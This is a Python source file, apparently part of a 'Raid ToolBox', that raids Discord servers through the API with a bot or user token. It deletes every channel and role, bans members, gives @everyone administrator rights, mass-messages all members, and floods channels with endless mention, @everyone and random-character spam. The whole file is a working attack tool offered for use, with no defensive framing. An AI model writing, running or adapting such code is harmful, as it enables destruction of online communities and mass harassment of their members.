try:
    import os
    import sys
    import time
    import random
    import string
    import asyncio
    import discord
    import requests
    import pyperclip
    from smconfig import *
    from colorama import init
    from termcolor import colored
    from discord import Permissions
    from threading import Thread
    from queue import Queue
except Exception as e:
    print ("Module import error: " + str(e))
    input()
    sys.exit()

class Worker(Thread):
    """
    Pooling
    """

    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as ex:
                pass
            finally:
                self.tasks.task_done()

class ThreadPool:
    """
    Pooling
    """

    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """
        Add a task to be completed by the thread pool
        """
        self.tasks.put((func, args, kargs))

    def map(self, func, args_list):
        """
        Map an array to the thread pool
        """
        for args in args_list:
            self.add_task(func, args)

    def wait_completion(self):
        """
        Await completions
        """
        self.tasks.join()

pool = ThreadPool(int(threadcount))
lists = []
users = []
channellist = []
client = discord.Client()

if sys.platform.startswith('win32'):
    clear = lambda: os.system('cls')
elif sys.platform.startswith('linux'):
    clear = lambda: os.system('clear')
init()


#Attacks
def deletechannel(channel):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.delete("https://discordapp.com/api/v6/channels/"+channel, headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        deletechannel(channel)

def deleterole(role,server):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.delete("https://discordapp.com/api/v6/guilds/"+str(server)+"/roles/"+str(role), headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(3)
        deleterole(role,server)
        
def senddmtouser(user):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
        
    payload = {
        'recipient_id': user
    }
    src = requests.post('https://discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload)
    userdm = src.content.decode()
    userdm = userdm[60:] #this works for now, will fix later.
    userdm = userdm[:18]
    payload = {"content" : dmcontent,"tts" : usetts,"mention_everyone" : "true"}
    src = requests.post("https://discordapp.com/api/v6/channels/"+userdm+"/messages", headers=headers, json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        senddmtouser(user)

def banuser(user,server):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.put("https://discordapp.com/api/v6/guilds/"+str(server)+"/bans/"+str(user)+"?delete-message-days=1&reason="+str(banreason), headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        banuser(user,server)

def createchannel(server,channelname,channeltype):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    payload = {'name': channelname,'type': channeltype}
    src = requests.post("https://discordapp.com/api/v6/guilds/"+str(server)+"/channels", headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        createchannel(channelname)

def sendspam(channel,msgcontent):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    payload = {"content" : msgcontent,"tts" : usetts,"mention_everyone" : "true"}
    src = requests.post("https://discordapp.com/api/v6/channels/"+channel+"/messages", headers=headers, json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        sendspam(channel,msgcontent)

print ("Make Sure you have modified smconfig.py before starting.")
@client.event
async def on_ready():
    if changegameonlogin == True:
        await client.change_presence(game=discord.Game(name=logingame))
    clear()
    print("Logged in as")
    print("User: "+str(client.user.name))
    print("Bot is in the following channels: ")
    counter = -1
    for x in client.servers:
        counter += 1
        print(str(counter)+'. ('+str(x.id)+') '+str(x)+'\n')
        lists.append(x.id)
    print('----------------------------------------')
    servernum = input('Select the server to configure bot actions: ')
    if servernum.lower() == 'back':
        print ("Returning to Raid ToolBox.")
        await client.logout()
    if servernum.lower() == 'b':
        print ("Returning to Raid ToolBox.")
        await client.logout()
    else:
        SERVER = lists[int(servernum)]
    await main(SERVER)

async def main(SERVER):
    #options
    clear()
    server = client.get_server(SERVER)
    print ("Server: " + server.name)
    print ("Server ID: " + str(SERVER))
    print ("----------------------------------------")
    print ("Options:")
    print (colored(" 0. Return to server select. \n 1. Destroy with config settings. \n 2. Create Server Invite. \n 3. Change What the bot is playing. \n 4. Leave server. \n 5. Return to Raid ToolBox Menu","green"))
    opts = input ("Select the number for your option: ")
    try:
        if int(opts) == 0:
               await on_ready()
        elif int(opts) == 1:
            #actions
            for c in server.channels:
                myperms = c.permissions_for(server.get_member(client.user.id))
                if myperms.administrator:
                    channellist.append(c)
                else:
                    print (colored("You do not have the permissions to destroy this server.","red"))
                    input ()
                    await main(SERVER)
            for i in server.members:
                users.append(i)

            if chandel == True:
                print('Deleting channels.')
                for channel in server.channels:
                    print (colored("Deleting " + str(channel.name),"blue"))
                    pool.add_task(deletechannel,channel.id)
                pool.wait_completion()
                print('Finished deleting channels.')
               
            if roledel == True:
               print ('Deleting Roles.')
               for role in server.roles:
                    print (colored("Deleting role: " + role.name,"blue"))
                    pool.add_task(deleterole,role.id,SERVER)
               pool.wait_completion()
               print('Finished deleting roles.')
               
            if senddm == True:
                for user in server.members:
                    print (colored('Sending DM to ' + user.name,"blue"))
                    pool.add_task(senddmtouser,user.id)
                pool.wait_completion()
            if namechange == True:
                print('Changing server name...')
                await client.edit_server(server=server, name=str(servname))

            if iconbegone == True:
                print('Removing icon...')
                await client.edit_server(server=server, icon=None)
                
            if changeicon == True:
                print('Changing icon...')
                if sys.platform.startswith('win32'):
                    icofile = ".\\spammer\\serversmasher\\" + iconfile
                elif sys.platform.startswith('linux'):
                    icofile = "spammer/serversmasher/" + iconfile
                with open(icofile, 'rb') as handle:
                    icon = handle.read()
                    await client.edit_server(server, icon=icon)
                    
            if giveeveryoneadmin == True:
                print('Giving everyone admin...')
                for role in server.roles:
                    if role.name == '@everyone':
                        await client.edit_role(server=server, role=role,permissions=Permissions.all())
                        break
                    
            if userban == True:
                print('Banning users...')
                for user in server.members:
                    if str(user) in user.name:
                        print (colored("Not Banning " + str(user.name),"green"))
                    else:
                        print (colored('Banning ' + str(user.name),"blue"))
                        pool.add_task(banuser,user.id,SERVER)
                pool.wait_completion()

            if gimmieadmin == True:
                print('Giving you admin...')
                role = await client.create_role(server, name="Admin", permissions=Permissions.all())
                user = server.get_member(me)
                await client.add_roles(user, role)
                
            if createchan == True:
                print('Creating channels.')
                for x in range(int(channelno)):
                    if chanmethod.lower() == "ascii":
                        asc = ""
                        for x in range(60):
                            num = random.randrange(13000)
                            asc = asc + chr(num)
                        pool.add_task(createchannel,SERVER,asc,"text")
                    if chanmethod.lower() == "set":
                        pool.add_task(createchannel,SERVER,channame,"text")
                    
                    if chanmethod.lower() == "voice":
                        pool.add_task(createchannel,SERVER,channame,"voice")
                pool.wait_completion()
                
                print ('Channels Created.')
                
            if chanmethod.lower() == "voice":
                if chandel == True:
                    print (colored("Not spamming, due to there only being voice channels in this server.","red"))
                    input ()
                    await main(SERVER)

            print('Preparing for next stage.')
            if spammethod == "asc":
                await ascii_spam(SERVER)
            if spammethod == "massment":
                await mass_tag(SERVER)
            if spammethod == "text":
                await text_spam(SERVER,customtxt)
            if spammethod == "everyone":
                await everyonespam(SERVER)
                
        elif int(opts) == 2:
            for channel in server.channels:
                if channel.type == discord.ChannelType.text:
                    invitelinknew = await client.create_invite(destination=channel, xkcd=True, max_uses=100)
                    invite = invitelinknew.url
                    pyperclip.copy(invite)
                    print (invite + " copied to clipboard.")
                    input ()
                    await main(SERVER)
                    
                elif channel.type == discord.ChannelType.voice:
                    invitelinknew = await client.create_invite(destination=channel, xkcd=True, max_uses=100)
                    invite = invitelinknew.url
                    pyperclip.copy(invite)
                    print (invite + " copied to clipboard.")
                    input ()
                    await main(SERVER)
                    
        elif int(opts) == 3:
            play = input ("Playing ")
            await client.change_presence(game=discord.Game(name=play))
            await main(SERVER)
            
        elif int(opts) == 4:
            print ("Are you sure you want to leave this server? (Y/N): ")
            yn = input()
            if yn.lower() == 'y':
                await client.leave_server(server)
                await on_ready()
            else:
                await main(SERVER)
                
        elif int(opts) == 5:
            print ("Returning to Raid ToolBox.")
            await client.logout()
            
    except Exception as e:
        print (colored("Error:","red"))
        print (colored(e,"red"))
        input()
        await main(SERVER)
        
async def mass_tag(SERVER):
    server = client.get_server(SERVER)
    await asyncio.sleep(5)
    await client.wait_until_ready()
    msg = ' '
    for m in server.members:
        msg += m.mention + ' '
    while not client.is_closed:
       for c in server.channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Mass Mentioning in: '+c.name)
            for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                pool.add_task(sendspam,c.id,m)
       pool.wait_completion()

async def ascii_spam(SERVER):
    server = client.get_server(SERVER)
    await asyncio.sleep(5)
    await client.wait_until_ready()
    while not client.is_closed:
       for c in server.channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Ascii Spamming in: '+c.name)
            asc = ""
            for x in range(1999):
                num = random.randrange(13000)
                asc = asc + chr(num)
            pool.add_task(sendspam,c.id,asc)
       pool.wait_completion()
       
async def text_spam(SERVER,customtxt):
    server = client.get_server(SERVER)
    await asyncio.sleep(5)
    await client.wait_until_ready()
    while not client.is_closed:
       for c in server.channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Text Spamming in: '+c.name)
            pool.add_task(sendspam,c.id,customtxt)
       pool.wait_completion()

async def everyonespam(SERVER):
    server = client.get_server(SERVER)
    await asyncio.sleep(5)
    await client.wait_until_ready()
    while not client.is_closed:
       for c in server.channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            message = "@everyone"
            print('@everyone Spamming in: '+c.name)
            pool.add_task(sendspam,c.id,message)
       pool.wait_completion()

if clienttype.lower() == "user":
    try:
        client.run(token, bot=False)
    except Exception as c:
        print (str(c))
if clienttype.lower() == "bot":
    try:
        client.run(token)
    except Exception as c:
        print (str(c))
        input()

